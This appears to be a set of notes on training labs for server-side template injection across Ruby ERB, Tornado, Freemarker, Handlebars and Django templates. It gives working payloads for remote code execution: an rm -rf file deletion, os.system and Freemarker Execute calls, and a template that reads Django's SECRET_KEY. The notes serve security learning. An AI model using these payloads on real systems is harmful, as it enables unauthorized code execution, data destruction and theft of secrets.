# Navigation
- [Basic server-side template injection](#basic-server-side-template-injection)
- [Basic server-side template injection (code context)](#basic-server-side-template-injection-code-context)
- [Server-side template injection using documentation](#server-side-template-injection-using-documentation)
- [Server-side template injection in an unknown language with a documented exploit](#server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
- [Server-side template injection with information disclosure via user-supplied objects](#server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
# Basic server-side template injection
- Delete `morale.txt`
1. Visit application
2. View first product and receive message "Unfortunately this product is out of stock"
	1. Notice there is a URL parameter passed and this is reflected in the HTTP response
```
academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```
3. Using different SSTI probing payloads we get successful execution against Ruby ERB
```
academy.net/?message=<%= 7*7 %>
```
- Notice the message is displayed as 49 in the HTTP response
4. Use simple code execution payload
```
<%= system("rm -rf /home/carlos/morale.txt") %>
```
# Basic server-side template injection (code context)
- Delete `morale.txt`
1. Login
2. Option to change preferred name
	1. This name appears when you comment on a blog post
3. Submit probing payload for basic SSTI
```
POST /my-account/change-blog-post-author-display
...<SNIP>...
blog-post-author-display={{7*7}}
```
4. Viewing a blog we've commented on renders as `{{49}}`, this is indicative of a code context
5. Confirm this by submitting a SSTI payload without the curly braces
```
POST /my-account/change-blog-post-author-display
...<SNIP>...
blog-post-author-display=7*7
```
6. Viewing a blog we've commented on renders as `49`, confirming the suspicion
7. Trigger a divide by zero error
```
POST /my-account/change-blog-post-author-display
...<SNIP>...
blog-post-author-display=1/0
```
8. Viewing the blog gives a verbose error that the template engine in use is Tornado
9. After reading the Tornado documentation, we can end the code block and insert our own one to get code execution
```
POST /my-account/change-blog-post-author-display
...<SNIP>...
blog-post-author-display=7*7}}{%import os%}{{os.system('id')
```
- We end the first template block with `}}` and start our own one. There is also no need to close the payload with curly braces at the end
# Server-side template injection using documentation
- Delete `morale.txt`
1. Login as the content manager with the credentials given
2. Viewing a product allows us to edit the template that is being used
	1. Viewing the data that is already inside discloses that the template syntax uses `${...}` syntax. This is an important clue
3. Submitting error-based polyglot payload doesn't trigger any errors
4. Use https://cheatsheet.hackmanit.de/template-injection-table/ to narrow down the template engine that is being used
	1. Toggle Error-Based Polyglots to be **off**
5. Copy the `${"<%-1-%>"}` payload and preview and confirm we get `<%-1-%>` reflected in the preview. This confirms the template engine can be 1 of 4 different templates
6. Copy the `<%=1%>@*#{1}` payload and preview to confirm we get `<%=1%>@*1` - This confirms the template engine is Freemarker
7. PayloadAllTheThings has a payload to get code execution
```
${"freemarker.template.utility.Execute"?new()("id")}
```
8. We have code execution
# Server-side template injection in an unknown language with a documented exploit
- Delete `morale.txt`
1. Selecting a product that is out of stock gives us a message saying it is out of stock
2. Submitting SSTI error polyglot payload triggers a 500 server error
```
GET /?message=${{<%[%'"}}%\.
```
2. In the error message we get a stack trace telling us that Node.js is used as well as Handlebars templating engine
```html
<p class=is-warning>/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
throw new Error(str);
^
Error: Parse error on line 1:
${{&lt;%[%&apos;&quot;}}%\.
---^
Expecting &apos;ID&apos;, &apos;STRING&apos;, &apos;NUMBER&apos;, &apos;BOOLEAN&apos;, &apos;UNDEFINED&apos;, &apos;NULL&apos;, &apos;DATA&apos;, got &apos;INVALID&apos;
at Parser.parseError (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
at Parser.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30)
at HandlebarsEnvironment.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
at compileInput (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
at [eval]:5:13
at Script.runInThisContext (node:vm:128:12)
at Object.runInThisContext (node:vm:306:38)
at node:internal/process/execution:83:21
at [eval]-wrapper:6:24
Node.js v19.8.1</p>
```
3. HackTricks has a Handlebars NodeJS code execution payload that is URL encoded
4. Put this in the encoder/decoder and change the payload to `sleep 5`
5. Send payload
```
GET /?message=%7b%7b%23...<SNIP>...7d%7d
```
- Response was in 5.5 seconds confirming code execution
- Change payload to complete the lab
# Server-side template injection with information disclosure via user-supplied objects
- Steal and submit the framework's secret key
1. Login as the content manager
2. View a product and you can edit the template that is being used, you get a preview option
	1. Looking inside a template, we can see that `{{` syntax is used giving us a hint
3. Preview a polyglot error based payload and we get an error disclosing that `Django` is in use
4. Submit the "Debug" payload to see what objects we can access
```
{% debug %}
```
5. In the response, we see we can access 'Settings'
6. ChatGPT tells us that some sensitive information we can get is `settings.SECRET_KEY`
```
{{settings.SECRET_KEY}}
```
